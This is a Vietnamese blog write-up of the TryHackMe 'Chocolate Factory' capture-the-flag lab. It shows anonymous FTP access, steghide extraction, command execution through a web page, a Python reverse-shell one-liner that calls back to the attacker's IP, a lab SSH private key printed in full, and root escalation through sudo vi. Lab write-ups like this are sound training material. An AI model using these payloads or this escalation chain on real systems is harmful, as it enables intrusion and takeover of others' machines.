---
layout: post
author: "Neo"
title: "Tryhackme - Chocolat Factory"
date: "2021-12-10"
tags: [
    "tryhackme",
    "web",
    "ftp",
    "linux",
    "ssh",
    "burpsuite"
]
categories: ctf
---

0. this unordered seed list will be replaced by toc as unordered list
{:toc}

![intro](/assets/img/2021-12-10-THM-Chocolate-Factory/1.webp)

Xin chào, Lẩu đây. Hôm nay tôi sẽ giải CTF [Tryhackme - Chocolate Factory](https://tryhackme.com/room/chocolatefactory)

## Reconnaissance

Vẫn như thông thường, việc đầu tiên cần làm là quét các cổng đang mở.

![scan-port](/assets/img/2021-12-10-THM-Chocolate-Factory/2.webp)

Ở đây tôi có 3 port đáng chú ý là 

- `ftp` với port 21 và có thể login với anonymous
- `ssh` với port 22
- `http` với port 80

Cùng xem qua port 21 ftp xem có gì không 

```python
┌──(neo㉿kali)-[~]
└─$ ftp 10.10.125.215
Connected to 10.10.125.215.
220 (vsFTPd 3.0.3)
Name (10.10.125.215:neo): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> dir
229 Entering Extended Passive Mode (|||7508|)
150 Here comes the directory listing.
-rw-rw-r--    1 1000     1000       208838 Sep 30  2020 gum_room.jpg
226 Directory send OK.
```

Lấy file ảnh này về, sau đó sử dụng *steghide* để xem có file nào ẩn trong ảnh này không. Tôi cũng không chắc lắm vì không có passphrase, nhưng không cần passphrase tôi vẫn có 1 file txt ở đây.

```python
┌──(neo㉿kali)-[~]
└─$ steghide extract -sf gum_room.jpg
Enter passphrase: 
wrote extracted data to "b64.txt".
```

Trong file này có 1 đoạn code base64 khá dài. Khi giả mã nó ra tôi sẽ có password của user  *charlie*

```python
┌──(neo㉿kali)-[~]
└─$ cat b64.txt | base64 -d
daemon:*:18380:0:99999:7:::
bin:*:18380:0:99999:7:::
sys:*:18380:0:99999:7:::
sync:*:18380:0:99999:7:::
games:*:18380:0:99999:7:::
man:*:18380:0:99999:7:::
lp:*:18380:0:99999:7:::
mail:*:18380:0:99999:7:::
news:*:18380:0:99999:7:::
uucp:*:18380:0:99999:7:::
proxy:*:18380:0:99999:7:::
www-data:*:18380:0:99999:7:::
backup:*:18380:0:99999:7:::
list:*:18380:0:99999:7:::
irc:*:18380:0:99999:7:::
gnats:*:18380:0:99999:7:::
nobody:*:18380:0:99999:7:::
systemd-timesync:*:18380:0:99999:7:::
systemd-network:*:18380:0:99999:7:::
systemd-resolve:*:18380:0:99999:7:::
_apt:*:18380:0:99999:7:::
mysql:!:18382:0:99999:7:::
tss:*:18382:0:99999:7:::
shellinabox:*:18382:0:99999:7:::
strongswan:*:18382:0:99999:7:::
ntp:*:18382:0:99999:7:::
messagebus:*:18382:0:99999:7:::
arpwatch:!:18382:0:99999:7:::
Debian-exim:!:18382:0:99999:7:::
uuidd:*:18382:0:99999:7:::
debian-tor:*:18382:0:99999:7:::
redsocks:!:18382:0:99999:7:::
freerad:*:18382:0:99999:7:::
iodine:*:18382:0:99999:7:::
tcpdump:*:18382:0:99999:7:::
miredo:*:18382:0:99999:7:::
dnsmasq:*:18382:0:99999:7:::
redis:*:18382:0:99999:7:::
usbmux:*:18382:0:99999:7:::
rtkit:*:18382:0:99999:7:::
sshd:*:18382:0:99999:7:::
postgres:*:18382:0:99999:7:::
avahi:*:18382:0:99999:7:::
stunnel4:!:18382:0:99999:7:::
sslh:!:18382:0:99999:7:::
nm-openvpn:*:18382:0:99999:7:::
nm-openconnect:*:18382:0:99999:7:::
pulse:*:18382:0:99999:7:::
saned:*:18382:0:99999:7:::
inetsim:*:18382:0:99999:7:::
colord:*:18382:0:99999:7:::
i2psvc:*:18382:0:99999:7:::
dradis:*:18382:0:99999:7:::
beef-xss:*:18382:0:99999:7:::
geoclue:*:18382:0:99999:7:::
lightdm:*:18382:0:99999:7:::
king-phisher:*:18382:0:99999:7:::
systemd-coredump:!!:18396::::::
_rpc:*:18451:0:99999:7:::
statd:*:18451:0:99999:7:::
_gvm:*:18496:0:99999:7:::
charlie:$6$**********************************************************/:18535:0:99999:7:::
```

Tôi đã thử dùng *john* để crack nhưng không thể. Tạm thời để đó đã. Ghé qua web nào. Web là trang login, thử qua và path cũng như user-pass đơn giản đều không có kết quả, tôi sẽ tìm web path với __*dirsearch*__ 

```python
[23:08:40] 200 -  569B  - /home.php                                         
[23:08:43] 200 -    1KB - /index.html                                       
[23:08:43] 200 -  273B  - /index.php.bak
[23:09:19] 403 -  278B  - /server-status                                    
[23:09:19] 403 -  278B  - /server-status/     
```

Thử vào */home.php* và ở đây tôi có thể sử dụng các command đơn giản để lấy thông tin về server. Lợi dụng nó để lấy nội dung file /etc/passwd để có thể crack lại hash trên bằng *john*

![/etc/passwd](/assets/img/2021-12-10-THM-Chocolate-Factory/3.jpg)

Đầu tiên tôi tạo file shadow với passwd lấy được khi decode file *b64.txt*

```python
┌──(neo㉿kali)-[~]
└─$ cat shadow.txt 
charlie:$6$CZJnCPeQWp9/***************************************************************:18535:0:99999:7:::
```

Sau đó sao chép passwd của *charlie* trong */etc/passwd*

```python
┌──(neo㉿kali)-[~]
└─$ cat passwd    
charlie:x:1000:1000:localhost:/home/charley:/bin/bash
```

Sử dụng __*unshadow*__ và __*john*__ để xem có crack được passwd của *charlie* không. Sau tất cả cố gắng thì tôi không thể crack được cái pass này, đành quay về web để khai thác command site.

Sử dụng BurpSuite để lấy request. 

![ls -la](/assets/img/2021-12-10-THM-Chocolate-Factory/4.webp)

Có 1 file tên là *key_rev_key*, đây là file binary. Sử dụng command `strings`

![strings key_rev_key](/assets/img/2021-12-10-THM-Chocolate-Factory/5.webp)

Vậy là tôi đã tìm được key. Tiếp theo tôi để ý ở bên trên còn có *validate.php*. 

![validate.php](/assets/img/2021-12-10-THM-Chocolate-Factory/6.webp)

Tôi tìm được pass của user *charlie* ở đây. Bây giờ thì thử các payload để lấy RCE. Trước đó tôi kiểm tra xem server có python hay không

![python--version](/assets/img/2021-12-10-THM-Chocolate-Factory/7.webp)

Tạo listener: `nc -lnvp 2402`, sau đó tạo payload với python3 và dán nó phần command

`python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.18.3.74",2402));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'`

```python
┌──(neo㉿kali)-[~]
└─$ nc -lnvp 2402             
listening on [any] 2402 ...
connect to [10.18.3.74] from (UNKNOWN) [10.10.184.210] 35746
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

www-data@chocolate-factory:/var/www/html$ 
```

## SSH

Trong thư mục */home* có *charlie*, trong này tôi có *user_flag* nhưng không thể mở được, tất nhiên rồi! Ngoài ra còn có 2 file teleport, trong đó file *teleport* là file rsa private key, thử lấy nó về và login ssh với rsa key này

```python
www-data@chocolate-factory:/home/charlie$ cat teleport
cat teleport
-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEA4adrPc3Uh98RYDrZ8CUBDgWLENUybF60lMk9YQOBDR+gpuRW
1AzL12K35/Mi3Vwtp0NSwmlS7ha4y9sv2kPXv8lFOmLi1FV2hqlQPLw/unnEFwUb
L4KBqBemIDefV5pxMmCqqguJXIkzklAIXNYhfxLr8cBS/HJoh/7qmLqrDoXNhwYj
B3zgov7RUtk15Jv11D0Itsyr54pvYhCQgdoorU7l42EZJayIomHKon1jkofd1/oY
fOBwgz6JOlNH1jFJoyIZg2OmEhnSjUltZ9mSzmQyv3M4AORQo3ZeLb+zbnSJycEE
RaObPlb0dRy3KoN79lt+dh+jSg/dM/TYYe5L4wIDAQABAoIBAD2TzjQDYyfgu4Ej
Di32Kx+Ea7qgMy5XebfQYquCpUjLhK+GSBt9knKoQb9OHgmCCgNG3+Klkzfdg3g9
zAUn1kxDxFx2d6ex2rJMqdSpGkrsx5HwlsaUOoWATpkkFJt3TcSNlITquQVDe4tF
w8JxvJpMs445CWxSXCwgaCxdZCiF33C0CtVw6zvOdF6MoOimVZf36UkXI2FmdZFl
kR7MGsagAwRn1moCvQ7lNpYcqDDNf6jKnx5Sk83R5bVAAjV6ktZ9uEN8NItM/ppZ
j4PM6/IIPw2jQ8WzUoi/JG7aXJnBE4bm53qo2B4oVu3PihZ7tKkLZq3Oclrrkbn2
EY0ndcECgYEA/29MMD3FEYcMCy+KQfEU2h9manqQmRMDDaBHkajq20KvGvnT1U/T
RcbPNBaQMoSj6YrVhvgy3xtEdEHHBJO5qnq8TsLaSovQZxDifaGTaLaWgswc0biF
uAKE2uKcpVCTSewbJyNewwTljhV9mMyn/piAtRlGXkzeyZ9/muZdtesCgYEA4idA
KuEj2FE7M+MM/+ZeiZvLjKSNbiYYUPuDcsoWYxQCp0q8HmtjyAQizKo6DlXIPCCQ
RZSvmU1T3nk9MoTgDjkNO1xxbF2N7ihnBkHjOffod+zkNQbvzIDa4Q2owpeHZL19
znQV98mrRaYDb5YsaEj0YoKfb8xhZJPyEb+v6+kCgYAZwE+vAVsvtCyrqARJN5PB
la7Oh0Kym+8P3Zu5fI0Iw8VBc/Q+KgkDnNJgzvGElkisD7oNHFKMmYQiMEtvE7GB
FVSMoCo/n67H5TTgM3zX7qhn0UoKfo7EiUR5iKUAKYpfxnTKUk+IW6ME2vfJgsBg
82DuYPjuItPHAdRselLyNwKBgH77Rv5Ml9HYGoPR0vTEpwRhI/N+WaMlZLXj4zTK
37MWAz9nqSTza31dRSTh1+NAq0OHjTpkeAx97L+YF5KMJToXMqTIDS+pgA3fRamv
ySQ9XJwpuSFFGdQb7co73ywT5QPdmgwYBlWxOKfMxVUcXybW/9FoQpmFipHsuBjb
Jq4xAoGBAIQnMPLpKqBk/ZV+HXmdJYSrf2MACWwL4pQO9bQUeta0rZA6iQwvLrkM
Qxg3lN2/1dnebKK5lEd2qFP1WLQUJqypo5TznXQ7tv0Uuw7o0cy5XNMFVwn/BqQm
G2QwOAGbsQHcI0P19XgHTOB7Dm69rP9j1wIRBOF7iGfwhWdi+vln
-----END RSA PRIVATE KEY-----
```

```python
┌──(neo㉿kali)-[~]
└─$ ssh -i id_rsa charlie@10.10.184.210
...
...
charlie@chocolate-factory:/$ 
charlie@chocolate-factory:/$ id
uid=1000(charlie) gid=1000(charley) groups=1000(charley),0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)
charlie@chocolate-factory:/$ cd /home/charlie
charlie@chocolate-factory:/home/charlie$ ls
teleport  teleport.pub  user.txt
charlie@chocolate-factory:/$
```

## Privilege escalation

`sudo -l`

```python
charlie@chocolate-factory:/home/charlie$ sudo -l
Matching Defaults entries for charlie on chocolate-factory:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User charlie may run the following commands on chocolate-factory:
    (ALL : !root) NOPASSWD: /usr/bin/vi
charlie@chocolate-factory:/home/charlie$ 
```

Thử qua [GTFOBins](https://gtfobins.github.io/gtfobins/vi/) và tôi tìm thấy cách leo thang đặc quyền với *vi*

```python
charlie@chocolate-factory:/home/charlie$ sudo vi -c ':!/bin/sh' /dev/null

# id
uid=0(root) gid=0(root) groups=0(root)
# ls /root/   
root.py
# cat /root/root.py
from cryptography.fernet import Fernet
import pyfiglet
key=input("Enter the key:  ")
f=Fernet(key)
encrypted_mess= 'gAAAAABfdb52eejIlEaE9ttPY8ckMMfHTIw5lamAWMy8yEdGPhnm9_H_yQikhR-bPy09-NVQn8lF_PDXyTo-T7CpmrFfoVRWzlm0OffAsUM7KIO_xbIQkQojwf_unpPAAKyJQDHNvQaJ'
dcrypt_mess=f.decrypt(encrypted_mess)
mess=dcrypt_mess.decode()
display1=pyfiglet.figlet_format("You Are Now The Owner Of ")
display2=pyfiglet.figlet_format("Chocolate Factory ")
print(display1)
print(display2)
print(mess)
```

Khi chạy file này thì phải nhập key. Tôi thử nhập key đã tìm được ở phần đầu và tìm được *root flag*

```python
# python /root/root.py
Enter the key:  b'-VkgXhFf6sAEcAwrC6YR-SZbiuSb8ABXeQuvhcGSQzY='
__   __               _               _   _                 _____ _          
\ \ / /__  _   _     / \   _ __ ___  | \ | | _____      __ |_   _| |__   ___ 
 \ V / _ \| | | |   / _ \ | '__/ _ \ |  \| |/ _ \ \ /\ / /   | | | '_ \ / _ \
  | | (_) | |_| |  / ___ \| | |  __/ | |\  | (_) \ V  V /    | | | | | |  __/
  |_|\___/ \__,_| /_/   \_\_|  \___| |_| \_|\___/ \_/\_/     |_| |_| |_|\___|
                                                                             
  ___                              ___   __  
 / _ \__      ___ __   ___ _ __   / _ \ / _| 
| | | \ \ /\ / / '_ \ / _ \ '__| | | | | |_  
| |_| |\ V  V /| | | |  __/ |    | |_| |  _| 
 \___/  \_/\_/ |_| |_|\___|_|     \___/|_|   
                                             

  ____ _                     _       _       
 / ___| |__   ___   ___ ___ | | __ _| |_ ___ 
| |   | '_ \ / _ \ / __/ _ \| |/ _` | __/ _ \
| |___| | | | (_) | (_| (_) | | (_| | ||  __/
 \____|_| |_|\___/ \___\___/|_|\__,_|\__\___|
                                             
 _____          _                    
|  ___|_ _  ___| |_ ___  _ __ _   _  
| |_ / _` |/ __| __/ _ \| '__| | | | 
|  _| (_| | (__| || (_) | |  | |_| | 
|_|  \__,_|\___|\__\___/|_|   \__, | 

```






